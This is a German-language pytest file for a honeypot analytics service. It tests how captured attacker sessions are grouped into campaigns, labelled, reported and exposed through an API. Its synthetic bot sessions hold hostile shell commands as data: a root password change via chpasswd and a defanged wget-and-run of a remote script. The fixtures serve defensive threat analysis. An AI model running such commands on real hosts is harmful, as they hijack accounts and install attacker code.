"""Worker-Job campaigns, Bericht und /stats/campaigns (Schritt 6.2, Marker ``db``).

Die Sitzungen sind synthetisch und werden direkt per SQL angelegt, damit
Herkunft, Startzeit und Art genau feststehen. ip_hash, ASN und Länder sind
erfunden, Adressen in Befehlen stammen aus RFC 5737 und sind entschärft.
"""

from __future__ import annotations

import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest
from sqlalchemy import text

from app.campaigns import fingerprint, normalized_sequence
from tests.conftest import make_ctx, run
from worker import jobs

pytestmark = pytest.mark.db

NOW = datetime(2026, 9, 18, 12, 0, tzinfo=timezone.utc)
START = datetime(2026, 9, 17, 10, 0, tzinfo=timezone.utc)

# Ein Bot, der bei jedem Besuch ein anderes Passwort setzt.
BOT = [
    "uname -a",
    'echo "root:{password}"|chpasswd|bash',
    "wget hxxp://198[.]51[.]100[.]7/x.sh; sh x.sh",
]
PASSWORDS = ["Xy7aB2kLmQ", "q9W3eRt5Zp", "Mn4bV6cX8z", "Lk3jH5gF7d", "Pq1wE2rT3y", "Zz9Yy8Xx7w"]


def bot_commands(number: int) -> list[str]:
    return [command.format(password=PASSWORDS[number % len(PASSWORDS)]) for command in BOT]


def bot_prefix(kind: str = "exec") -> str:
    key = fingerprint(kind, normalized_sequence(bot_commands(0)))
    assert key is not None
    return key[:12]


_counter = iter(range(1, 10_000))


def add_session(
    engine,
    commands: list[str],
    *,
    variant: str = "a",
    interactive: bool = False,
    started: datetime = START,
    country: str | None = "DE",
    asn: str | None = "AS64496",
    ip_hash: str = "a" * 64,
    techniques: list[str] | None = None,
) -> int:
    number = next(_counter)
    with engine.begin() as connection:
        session_id = connection.execute(
            text(
                """
                INSERT INTO sessions (cowrie_session, variant, sensor_name, ip_hash, country,
                                      asn, interactive, started_at, command_count)
                VALUES (:cowrie, :variant, :sensor, :ip_hash, :country, :asn, :interactive,
                        :started, :count)
                RETURNING id
                """
            ),
            {
                "cowrie": f"sitzung{number:05d}",
                "variant": variant,
                "sensor": f"hp-{variant}",
                "ip_hash": ip_hash,
                "country": country,
                "asn": asn,
                "interactive": interactive,
                "started": started,
                "count": len(commands),
            },
        ).scalar_one()
        for sequence, command in enumerate(commands, start=1):
            connection.execute(
                text(
                    """
                    INSERT INTO commands (session_id, sequence, occurred_at, command,
                                          command_hash, techniques)
                    VALUES (:session, :sequence, :at, :command, :hash, CAST(:techniques AS jsonb))
                    """
                ),
                {
                    "session": session_id,
                    "sequence": sequence,
                    "at": started + timedelta(seconds=sequence),
                    "command": command,
                    "hash": f"{number:064d}"[-64:],
                    "techniques": json.dumps(techniques or []),
                },
            )
    return session_id


def add_bot_sessions(engine, count: int, **kwargs) -> list[int]:
    return [
        add_session(engine, bot_commands(n), started=START + timedelta(minutes=n), **kwargs)
        for n in range(count)
    ]


def build(database_url: str, **kwargs) -> dict:
    return run(jobs.build_campaigns, make_ctx(database_url, NOW), **kwargs)


def campaigns(engine) -> list[dict]:
    with engine.connect() as connection:
        rows = connection.execute(text("SELECT * FROM campaigns ORDER BY id")).mappings().all()
    return [dict(row) for row in rows]


def assignments(engine) -> dict[int, int | None]:
    with engine.connect() as connection:
        return dict(connection.execute(text("SELECT id, campaign_id FROM sessions")).all())


def write_labels(path: Path, *entries: tuple[str, str, str]) -> Path:
    lines = ["campaigns:"]
    for prefix, label, description in entries:
        lines += [f'  - prefix: "{prefix}"', f'    label: "{label}"', f'    description: "{description}"']
    if not entries:
        lines = ["campaigns: []"]
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    return path


@pytest.fixture
def no_labels(tmp_path: Path) -> Path:
    return write_labels(tmp_path / "campaigns.yml")


# --- Mindestgröße und Kennzahlen --------------------------------------------------


def test_four_sessions_are_no_campaign_five_are(migrated, database_url, no_labels):
    add_bot_sessions(migrated, 4)
    result = build(database_url, labels_path=no_labels)
    assert result["fingerprints"] == 1 and result["kampagnen"] == 0
    assert campaigns(migrated) == []
    assert set(assignments(migrated).values()) == {None}

    add_session(migrated, bot_commands(4), started=START + timedelta(hours=1))
    result = build(database_url, labels_path=no_labels)
    assert result["kampagnen"] == 1 and result["neu"] == 1 and result["zugeordnet"] == 5
    (campaign,) = campaigns(migrated)
    assert set(assignments(migrated).values()) == {campaign["id"]}


def test_sessions_without_commands_get_no_campaign(migrated, database_url, no_labels):
    add_bot_sessions(migrated, 5)
    empty = add_session(migrated, [])
    result = build(database_url, labels_path=no_labels)
    assert result["sitzungen"] == 5
    assert assignments(migrated)[empty] is None


def test_the_campaign_carries_its_figures(migrated, database_url, no_labels):
    offsets = [0, 60, 120, 300, 600]
    origins = [
        ("a", "DE", "AS64496", "1" * 64, ["T1082"]),
        ("a", "DE", "AS64496", "1" * 64, ["T1082"]),
        ("a", "NL", "AS64497", "2" * 64, ["T1082"]),
        ("b", None, None, "3" * 64, ["T1105"]),
        ("b", "DE", "AS64497", "3" * 64, []),
    ]
    for number, (offset, (variant, country, asn, ip_hash, tags)) in enumerate(zip(offsets, origins)):
        add_session(
            migrated,
            bot_commands(number),
            variant=variant,
            country=country,
            asn=asn,
            ip_hash=ip_hash,
            techniques=tags,
            started=START + timedelta(seconds=offset),
        )
    build(database_url, labels_path=no_labels)

    (campaign,) = campaigns(migrated)
    assert campaign["fingerprint"].startswith(bot_prefix())
    assert campaign["kind"] == "exec"
    assert (campaign["sessions_a"], campaign["sessions_b"]) == (3, 2)
    assert campaign["countries"] == {"??": 1, "DE": 3, "NL": 1}
    assert campaign["techniques"] == ["T1082", "T1105"]
    assert campaign["first_seen"] == START
    assert campaign["last_seen"] == START + timedelta(seconds=600)
    assert campaign["sources"] == 3
    assert campaign["asns"] == 2
    # Abstände 60, 60, 180, 300 Sekunden
    assert campaign["median_interval_s"] == 120
    assert campaign["label"] is None and campaign["description"] is None


def test_exec_and_shell_sessions_are_separate_campaigns(migrated, database_url, no_labels):
    add_bot_sessions(migrated, 5, interactive=False)
    add_bot_sessions(migrated, 5, interactive=True)
    result = build(database_url, labels_path=no_labels)
    assert result["kampagnen"] == 2
    assert sorted(c["kind"] for c in campaigns(migrated)) == ["exec", "interactive"]


def test_the_job_walks_through_several_batches(migrated, database_url, no_labels, monkeypatch):
    monkeypatch.setattr(jobs, "CAMPAIGN_BATCH", 2)
    add_bot_sessions(migrated, 5)
    add_session(migrated, ["id"])
    result = build(database_url, labels_path=no_labels)
    assert result["sitzungen"] == 6 and result["zugeordnet"] == 5


# --- Idempotent und Aufräumen ---------------------------------------------------------


def test_a_second_run_changes_nothing(migrated, database_url, no_labels):
    add_bot_sessions(migrated, 6)
    add_bot_sessions(migrated, 5, interactive=True, variant="b")
    first = build(database_url, labels_path=no_labels)
    assert first["neu"] == 2
    before_campaigns, before_sessions = campaigns(migrated), assignments(migrated)

    second = build(database_url, labels_path=no_labels)
    assert second["neu"] == second["geaendert"] == second["entfernt"] == 0
    assert second["sitzungen_geaendert"] == 0
    # Auch updated_at bleibt, weil nichts geschrieben wird.
    assert campaigns(migrated) == before_campaigns
    assert assignments(migrated) == before_sessions


def test_new_sessions_update_the_figures(migrated, database_url, no_labels):
    add_bot_sessions(migrated, 5)
    build(database_url, labels_path=no_labels)
    (before,) = campaigns(migrated)

    add_session(migrated, bot_commands(5), variant="b", started=START + timedelta(days=1))
    result = build(database_url, labels_path=no_labels)
    assert result["geaendert"] == 1 and result["neu"] == 0
    (after,) = campaigns(migrated)
    assert after["id"] == before["id"]
    assert after["sessions_b"] == 1
    assert after["last_seen"] == START + timedelta(days=1)


def test_a_vanished_fingerprint_is_removed(migrated, database_url, no_labels):
    ids = add_bot_sessions(migrated, 5)
    build(database_url, labels_path=no_labels)
    assert len(campaigns(migrated)) == 1

    # Eine Sitzung zählt jetzt anders, es bleiben vier mit dem alten Fingerprint.
    with migrated.begin() as connection:
        connection.execute(
            text("UPDATE commands SET command = 'id' WHERE session_id = :id AND sequence = 1"),
            {"id": ids[0]},
        )
    result = build(database_url, labels_path=no_labels)
    assert result["entfernt"] == 1 and result["kampagnen"] == 0
    assert campaigns(migrated) == []
    assert set(assignments(migrated).values()) == {None}


def test_a_hand_set_campaign_on_a_session_without_commands_is_cleared(
    migrated, database_url, no_labels
):
    add_bot_sessions(migrated, 5)
    empty = add_session(migrated, [])
    build(database_url, labels_path=no_labels)
    (campaign,) = campaigns(migrated)
    with migrated.begin() as connection:
        connection.execute(
            text("UPDATE sessions SET campaign_id = :c WHERE id = :id"),
            {"c": campaign["id"], "id": empty},
        )
    build(database_url, labels_path=no_labels)
    assert assignments(migrated)[empty] is None


def test_a_held_lock_stops_the_job_instead_of_waiting(migrated, database_url, no_labels, monkeypatch):
    """Hält jemand eine Sitzung gesperrt, bricht der Job ab und schreibt nichts."""
    from sqlalchemy.exc import OperationalError

    monkeypatch.setattr(jobs, "LOCK_TIMEOUT", "200ms")
    ids = add_bot_sessions(migrated, 5)
    with migrated.connect() as holder:
        holder.execute(text("SELECT id FROM sessions WHERE id = :id FOR UPDATE"), {"id": ids[2]})
        with pytest.raises(OperationalError):
            build(database_url, labels_path=no_labels)
        holder.rollback()
    assert campaigns(migrated) == []
    assert set(assignments(migrated).values()) == {None}


# --- Labels ---------------------------------------------------------------------------


def test_labels_come_from_the_file_and_survive_a_rebuild(migrated, database_url, tmp_path):
    labels = write_labels(
        tmp_path / "campaigns.yml",
        (bot_prefix(), "Passwort-Dropper", "Setzt ein Passwort und lädt ein Skript."),
        ("ffffffffffff", "Gibt es nicht", "Kein Fingerprint dazu."),
    )
    ids = add_bot_sessions(migrated, 5)
    result = build(database_url, labels_path=labels)
    assert result["gelabelt"] == 1
    assert result["labels_ohne_kampagne"] == ["ffffffffffff"]
    (campaign,) = campaigns(migrated)
    assert campaign["label"] == "Passwort-Dropper"
    assert campaign["description"] == "Setzt ein Passwort und lädt ein Skript."

    # Von Hand gesetzt zählt nicht: Der nächste Lauf nimmt wieder die Datei.
    with migrated.begin() as connection:
        connection.execute(text("UPDATE campaigns SET label = 'Von Hand'"))
    build(database_url, labels_path=labels)
    assert campaigns(migrated)[0]["label"] == "Passwort-Dropper"

    # Verschwindet die Kampagne und kommt wieder, bekommt sie ihr Label zurück.
    with migrated.begin() as connection:
        connection.execute(
            text("UPDATE commands SET command = 'id' WHERE session_id = :id AND sequence = 1"),
            {"id": ids[0]},
        )
    build(database_url, labels_path=labels)
    assert campaigns(migrated) == []
    add_session(migrated, bot_commands(9), started=START + timedelta(days=2))
    build(database_url, labels_path=labels)
    assert campaigns(migrated)[0]["label"] == "Passwort-Dropper"


def test_a_removed_label_is_removed_from_the_campaign(migrated, database_url, tmp_path):
    path = tmp_path / "campaigns.yml"
    add_bot_sessions(migrated, 5)
    build(database_url, labels_path=write_labels(path, (bot_prefix(), "Probe", "Test.")))
    build(database_url, labels_path=write_labels(path))
    campaign = campaigns(migrated)[0]
    assert campaign["label"] is None and campaign["description"] is None


def test_a_broken_label_file_writes_nothing(migrated, database_url, tmp_path):
    from app.campaigns import LabelsError

    path = tmp_path / "campaigns.yml"
    path.write_text('campaigns:\n  - prefix: "XYZ"\n', encoding="utf-8")
    add_bot_sessions(migrated, 5)
    with pytest.raises(LabelsError):
        build(database_url, labels_path=path)
    assert campaigns(migrated) == []


# --- API --------------------------------------------------------------------------------


def test_the_api_shows_only_labelled_campaigns(client, migrated, database_url, tmp_path):
    labels = write_labels(tmp_path / "campaigns.yml", (bot_prefix(), "Passwort-Dropper", "Test."))
    add_bot_sessions(migrated, 6, ip_hash="c" * 64)
    # Eine zweite, größere Kampagne ohne Label bleibt intern.
    for n in range(8):
        add_session(migrated, ["uname -a", "cat /proc/cpuinfo"], started=START + timedelta(hours=n))
    build(database_url, labels_path=labels)
    assert len(campaigns(migrated)) == 2

    response = client.get("/stats/campaigns", headers={"X-Forwarded-For": "198.51.100.210"})
    body = response.json()
    assert [c["label"] for c in body["campaigns"]] == ["Passwort-Dropper"]
    (campaign,) = body["campaigns"]
    assert set(campaign) == {
        "label",
        "description",
        "kind",
        "first_seen",
        "last_seen",
        "sessions",
        "countries",
        "techniques",
        "sources",
        "asns",
        "median_interval_s",
    }
    assert campaign["sessions"] == {"a": 6, "b": 0}
    assert campaign["sources"] == 1 and campaign["asns"] == 1
    assert campaign["median_interval_s"] == 60
    assert "c" * 64 not in response.text
    assert "fingerprint" not in response.text


# --- Bericht ------------------------------------------------------------------------------


def test_the_report_lists_the_largest_campaigns_with_their_first_commands(
    migrated, database_url, no_labels
):
    add_bot_sessions(migrated, 6)
    for n in range(5):
        add_session(
            migrated,
            ["uname -a", 'echo "root:Aa1Bb2Cc3"|chpasswd|bash', "id", "w", "id"],
            started=START + timedelta(hours=n),
        )
    build(database_url, labels_path=no_labels)

    report = run(jobs.campaigns_report, make_ctx(database_url, NOW))
    assert report["kampagnen"] == 2 and report["gelabelt"] == 0
    largest, second = report["groesste"]
    assert largest["prefix"] == bot_prefix()
    assert largest["length"] == 3
    assert largest["commands"] == [
        "uname -a",
        'echo "root:<PW>"|chpasswd|bash',
        "wget <URL>; sh x.sh",
    ]
    assert (largest["sessions_a"], largest["sources"], largest["median_interval_s"]) == (6, 1, 60)
    # Beide beginnen mit "uname -a" und dem Passwort, der dritte Befehl
    # unterscheidet sie: p3 ist verschieden.
    assert second["length"] == 5 and len(second["commands"]) == 3
    assert largest["p3"] != second["p3"]
    assert "ip_hash" not in json.dumps(report)


def test_the_report_respects_its_limit(migrated, database_url, no_labels):
    add_bot_sessions(migrated, 5)
    build(database_url, labels_path=no_labels)
    report = run(jobs.campaigns_report, make_ctx(database_url, NOW), limit=0)
    assert report["groesste"] == [] and report["kampagnen"] == 1
